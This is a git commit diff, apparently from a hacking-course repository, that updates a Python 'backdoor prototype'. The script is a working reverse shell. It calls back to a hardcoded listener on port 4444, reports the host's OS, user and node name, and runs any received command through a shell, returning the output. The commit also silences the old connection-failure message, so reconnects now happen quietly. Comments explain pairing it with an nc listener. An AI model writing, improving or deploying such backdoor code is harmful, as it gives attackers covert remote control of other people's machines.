4b5c10d6094c8d3494e379a89c3d959d24d6179f
Umi <umi.oba28@gmail.com>
2026-03-09 04:17:15 -0700

    Decoded errors with str formatting. Formated the connection identification for better usability.

--- chapter2/backdoorProto.py
+++ chapter2/backdoorProto.py
@@ -1,45 +1,63 @@
 # This is a backdoor prototype that will ran by opening up a port by using nc -lvp 4444 (or any other port)
 # User will then download this file on another linux device (I used raspberry pi as my hardware)
 # On the other device, run python backdoorProto.py
+# Do not use Wi-Fi with AP isolation
 
 import socket
 import subprocess
 import os
 import time
+import platform
 
 def connect():
-    # Sets up a TCP Environment 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # User's IP and port
+    server_ip = '192.168.11.19'
+    server_port = 4444
+
     while True:
         try:
-            s.connect(('10.76.134.200', 4444)) # Test whether it connects
-            s.send(str.encode("[!] User Detected: " + os.getcwd() + ": "))
-    
+
+            # Creates a TCP Client connection
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((server_ip, server_port))
+            
+            # Identifies connection 
+            sys_info = f"\n--- CONNECTION ESTABLISHED ---\nOS: {platform.system()} {platform.release()}\nUser: {subprocess.getoutput('whoami')}\nNode: {platform.node()}\n------------------------------\n"
+            s.send(sys_info.encode())
+
             while True:
+                # Send the prompt
+                prompt = f"{subprocess.getoutput('whoami')}@{os.getcwd()}: "
+                s.send(prompt.encode())
+                
+                # Data received
                 data = s.recv(1024)
-                usrcmd = data.decode("utf-8") # String of command sent from user
+
+
+                if not data: break
+                
+                usrcmd = data.decode("utf-8").strip()
+
+                # End with command "end"
+                if usrcmd.lower() == "end": break
+
+                # For "cd" commands, avoids only having a child process change 
                 if usrcmd.startswith("cd "):
                     try:
-                        os.chdir(usrcmd[3:].strip()) # Changes directory in the shell
-                        continue
+                        os.chdir(usrcmd[3:].strip())
                     except OSError as e:
-                        s.send(str.encode("Error: " + str.encode(e.strerror) + "\n"))
-                        continue
-                proc = subprocess.Popen(data.decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-                proc.stdout, proc.stderr = proc.communicate()
-                output = proc.stdout + proc.stderr
+                        s.send(f"Error: {str(e)}\n".encode())
+                    continue
 
-                s.send(str.encode(output + os.getcwd() + ": "))
-
-                if usrcmd == "end": # End connection
-                    break
+                # Execute and return results
+                proc = subprocess.Popen(usrcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout, stderr = proc.communicate()
+                s.send(stdout + stderr)
 
             s.close()
-        except socket.error:
-            print("Is not connecting")
-            time.sleep(5) # Wait 5 seconds and attempt reconnecting
-
-
+        
+        except Exception:
+            time.sleep(5)
 
 if __name__ == "__main__":
     connect()
